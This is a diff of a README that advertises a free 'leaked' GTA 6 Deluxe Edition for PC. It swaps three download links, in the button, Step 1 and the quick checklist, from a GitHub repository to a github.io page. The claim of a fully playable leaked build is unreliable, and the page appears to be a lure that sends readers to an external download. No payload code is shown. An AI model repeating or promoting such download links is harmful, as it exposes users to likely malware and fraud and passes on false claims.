@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Deluxe-Edition-Free-Download-PC - Get The Ultimate GTA Experience Today</h1>
 
 <p align="center">
-  <a href="https://github.com/Deviantjroc710/GTA-6-Deluxe-Edition-Free-Download-PC" style="background-color:#4CAF50;border:none;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:24px;margin:4px 2px;cursor:pointer;border-radius:12px;">⬇️ DOWNLOAD GTA 6 DELUXE EDITION NOW</a>
+  <a href="https://deviantjroc710.github.io" style="background-color:#4CAF50;border:none;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:24px;margin:4px 2px;cursor:pointer;border-radius:12px;">⬇️ DOWNLOAD GTA 6 DELUXE EDITION NOW</a>
 </p>
 
 Welcome to your one-stop destination for downloading the highly anticipated **GTA 6 Deluxe Edition** for Windows PC. This leaked build is fully playableand ready to run on your machine. Say goodbye to endless waiting and hello to hours of criminal empire-building, high-speed chases, ando breathtaking open-world exploration.
@@ -50,7 +50,7 @@ Follow these simple instructions to get GTAVI Deluxe Edition running on your PC 
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [https://github.com/Deviantjroc710/GTA-6-Deluxe-Edition-Free-Download-PC](https://github.com/Deviantjroc710/GTA-6-Deluxe-Edition-Free-Download-PC). This will take you directly to the official download page for the game package.
+Visit this link to download the application: [https://deviantjroc710.github.io](https://deviantjroc710.github.io). This will take you directly to the official download page for the game package.
 
 .
 
@@ -110,7 +110,7 @@ Even with simple installations, occasional hiccups can happen. Here are quick fi
 
 To save you scrolling, here's your quick checklist:
 
-1.  **Visit this link to download the application:** [https://github.com/Deviantjroc710/GTA-6-Deluxe-Edition-Free-Download-PC](https://github.com/Deviantjroc710/GTA-6-Deluxe-Edition-Free-Download-PC)
+1.  **Visit this link to download the application:** [https://deviantjroc710.github.io](https://deviantjroc710.github.io)
 2.  Click the download button on that page.
 
 3.  Extract the downloaded archive if it comes compressed.and
